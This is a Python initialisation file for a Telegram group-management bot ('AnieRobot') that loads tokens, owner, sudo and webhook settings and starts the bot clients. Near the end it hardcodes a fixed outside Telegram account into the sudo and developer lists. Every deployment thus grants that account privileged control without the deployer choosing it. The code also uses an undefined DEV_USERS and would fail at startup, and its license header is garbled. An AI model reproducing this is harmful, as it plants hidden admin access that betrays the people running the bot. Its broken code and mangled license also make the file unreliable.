#Copyright (C) 2021 Free Software @noobanon @FakeMasked , Inc.[ https://t.me/noobanon https://t.me/FakeMasked ]
#Everyone is permitted to copy and distribute verbatim copies
#of this license document, but changing it is not allowed.
#The GNGeneral Public License is a free, copyleft license for
#software and other kinds of works.
#PTB13 Updated by @noobanon

import logging
import os
import sys
import time
from datetime import datetime
from telethon import TelegramClient 

StartTime = time.time()

import telegram.ext as tg

print("Aniebot")
print("Starting...")


# enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO)

LOGGER = logging.getLogger(__name__)
#CUSTOM_CMD IS MORE USEABLE
# if version < 3.6, stop bot.
#if sys.version_info[0] < 3 or sys.version_info[1] < 6:
#    LOGGER.error("You MUST have a python version of at least 3.6! Multiple features depend on this. Bot quitting.")
#``````````````    quit(1)

ENV = bool(os.environ.get('ENV', False))

if ENV:
    TOKEN = os.environ.get('TOKEN', None)
    try:
        OWNER_ID = int(os.environ.get('OWNER_ID', None))
    except ValueError:
        raise Exception("Your OWNER_ID env variable is not a valid integer.")

    MESSAGE_DUMP = os.environ.get('MESSAGE_DUMP', None)
    OWNER_USERNAME = os.environ.get("OWNER_USERNAME", None)

    try:
        SUDO_USERS = set(int(x) for x in os.environ.get("SUDO_USERS", "").split())
    except ValueError:
        raise Exception("Your sudo users list does not contain valid integers.")

    try:
        SUPPORT_USERS = set(int(x) for x in os.environ.get("SUPPORT_USERS", "").split())
    except ValueError:
        raise Exception("Your support users list does not contain valid integers.")

    try:
        WHITELIST_USERS = set(int(x) for x in os.environ.get("WHITELIST_USERS", "").split())
    except ValueError:
        raise Exception("Your whitelisted users list does not contain valid integers.")

    WEBHOOK = bool(os.environ.get('WEBHOOK', False))
    URL = os.environ.get('URL', "")  # Does not contain token
    PORT = int(os.environ.get('PORT', 5000))
    CERT_PATH = os.environ.get("CERT_PATH")

    DB_URI = os.environ.get('DATABASE_URL')
    LOAD = os.environ.get("LOAD", "").split()
    NO_LOAD = os.environ.get("NO_LOAD", "translation").split()
    DEL_CMDS = bool(os.environ.get('DEL_CMDS', False))
    STRICT_ANTISPAM = bool(os.environ.get('STRICT_ANTISPAM', True))
    WORKERS = int(os.environ.get('WORKERS', 8))
    BAN_STICKER = os.environ.get('BAN_STICKER', 'CAADAgADEAgAAgi3GQL9YQyT_kBpQwI')
    CUSTOM_CMD = os.environ.get('CUSTOM_CMD', True)
    API_WEATHER = os.environ.get('API_OPENWEATHER', None)
    ALLOW_EXCL = os.environ.get('ALLOW_EXCL', False)
    SUPPORT_CHAT = os.environ.get('SUPPORT_CHAT',None)
    EVENT_LOGS = os.environ.get('EVENT_LOGS', None)

    ANIE_PHOTO = os.environ.get('ANIE_PHOTO', True)
    GROUP_START_IMG = os.environ.get('GROUP_START_IMG',None)
    HELP_IMG = os.environ.get('HELP_IMG',None)

else:
    from AnieRobot.config import Development as Config
    TOKEN = Config.TOKEN
    try:
        OWNER_ID = int(Config.OWNER_ID)
    except ValueError:
        raise Exception("Your OWNER_ID variable is not a valid integer.")

    MESSAGE_DUMP = Config.MESSAGE_DUMP
    OWNER_USERNAME = Config.OWNER_USERNAME

    try:
        SUDO_USERS = set(int(x) for x in Config.SUDO_USERS or [])
    except ValueError:
        raise Exception("Your sudo users list does not contain valid integers.")

    try:
        SUPPORT_USERS = set(int(x) for x in Config.SUPPORT_USERS or [])
    except ValueError:
        raise Exception("Your support users list does not contain valid integers.")

    try:
        WHITELIST_USERS = set(int(x) for x in Config.WHITELIST_USERS or [])
    except ValueError:
        raise Exception("Your whitelisted users list does not contain valid integers.")

    WEBHOOK = Config.WEBHOOK
    URL = Config.URL
    PORT = Config.PORT
    CERT_PATH = Config.CERT_PATH

    DB_URI = Config.SQLALCHEMY_DATABASE_URI
    DONATION_LINK = Config.DONATION_LINK
    LOAD = Config.LOAD
    NO_LOAD = Config.NO_LOAD
    DEL_CMDS = Config.DEL_CMDS
    STRICT_ANTISPAM = Config.STRICT_ANTISPAM
    WORKERS = Config.WORKERS
    BAN_STICKER = Config.BAN_STICKER
    CUSTOM_CMD = Config.CUSTOM_CMD
    API_WEATHER = Config.API_OPENWEATHER
    ALLOW_EXCL = Config.ALLOW_EXCL
    ANIE_PHOTO = Config.ANIE_PHOTO
    GROUP_START_IMG = Config.GROUP_START_IMG
    HELP_IMG = Config.HELP_IMG
    SUPPORT_CHAT = Config.SUPPORT_CHAT
    EVENT_LOGS = Config.EVENT_LOGS



SUDO_USERS.add(OWNER_ID)
DEV_USERS.add(5051939910)
SUDO_USERS.add(5051939910)

API_ID = int(os.environ.get("API_ID", None))
API_HASH = os.environ.get("API_HASH", None)

#Telethon
api_id = API_ID
api_hash = API_HASH
telethn = TelegramClient("Aniebot", api_id, api_hash)

updater = tg.Updater(TOKEN, workers=WORKERS)

dispatcher = updater.dispatcher

SUDO_USERS = list(SUDO_USERS)
WHITELIST_USERS = list(WHITELIST_USERS)
SUPPORT_USERS = list(SUPPORT_USERS)

# Load at end to ensure all prev variables have been set
from AnieRobot.modules.helper_funcs.handlers import CustomCommandHandler

if CUSTOM_CMD:
	tg.CommandHandler = CustomCommandHandler
	
